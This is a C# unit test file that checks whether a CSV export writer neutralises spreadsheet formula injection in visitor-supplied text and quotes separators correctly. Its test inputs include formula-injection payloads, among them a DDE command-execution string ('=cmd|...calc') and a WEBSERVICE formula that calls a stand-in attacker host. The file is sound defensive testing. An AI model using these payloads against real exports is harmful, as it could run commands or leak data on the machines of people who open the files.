using System.Text;
using Bojan.Infrastructure.Jobs;

namespace Bojan.Api.Tests;

/// <summary>
/// Report exports are written to be opened in Excel, and they carry text that
/// anonymous visitors typed — the B2B forms and the contact form are both
/// unauthenticated. A cell that begins with a formula character is evaluated
/// when the operator opens the file.
/// </summary>
public class CsvWriterTests
{
    [Theory]
    [InlineData("=1+1")]
    [InlineData("=cmd|'/c calc'!A0")]
    [InlineData("=WEBSERVICE(\"http://attacker.example\")")]
    [InlineData("+1")]
    [InlineData("-1")]
    [InlineData("@SUM(A1)")]
    public void Neutralises_a_field_that_starts_like_a_formula(string payload)
    {
        var field = CsvWriter.Field(payload);

        // Quoted or not, what matters is that the cell's first character is no
        // longer one a spreadsheet evaluates.
        var cell = field.StartsWith('"') ? field[1..^1].Replace("\"\"", "\"") : field;

        Assert.StartsWith("'", cell, StringComparison.Ordinal);
        Assert.EndsWith(payload, cell, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("\t=1+1")]
    [InlineData("\r=1+1")]
    public void Neutralises_leading_whitespace_a_spreadsheet_would_strip(string payload)
    {
        Assert.Contains("'", CsvWriter.Field(payload), StringComparison.Ordinal);
    }

    [Fact]
    public void Leaves_ordinary_text_alone()
    {
        Assert.Equal("دفتر یادداشت", CsvWriter.Field("دفتر یادداشت"));
        Assert.Equal("1200", CsvWriter.Field(1200));
        Assert.Equal(string.Empty, CsvWriter.Field(null));
    }

    [Fact]
    public void Quotes_the_separators_that_would_otherwise_split_a_row()
    {
        Assert.Equal("\"a,b\"", CsvWriter.Field("a,b"));
        Assert.Equal("\"a\"\"b\"", CsvWriter.Field("a\"b"));
        Assert.Equal("\"a\nb\"", CsvWriter.Field("a\nb"));
    }

    [Fact]
    public void A_carriage_return_inside_a_value_is_quoted_rather_than_breaking_the_row()
    {
        // Previously only ',', '"' and '\n' were quoted, so a lone CR ended the
        // record early for any reader that treats it as a line break.
        Assert.Equal("\"a\rb\"", CsvWriter.Field("a\rb"));
    }

    private sealed record Row(string Organisation, int Orders);

    [Fact]
    public void Writes_a_header_a_BOM_and_one_line_per_row()
    {
        var bytes = CsvWriter.Write([new Row("=HYPERLINK(\"http://x\")", 3), new Row("بوژان", 1)]);

        Assert.Equal(Encoding.UTF8.GetPreamble(), bytes[..3]);

        var text = Encoding.UTF8.GetString(bytes[3..]);
        var lines = text.Split(Environment.NewLine, StringSplitOptions.RemoveEmptyEntries);

        Assert.Equal("Organisation,Orders", lines[0]);
        Assert.Contains("'=HYPERLINK", lines[1], StringComparison.Ordinal);
        Assert.Equal("بوژان,1", lines[2]);
    }
}
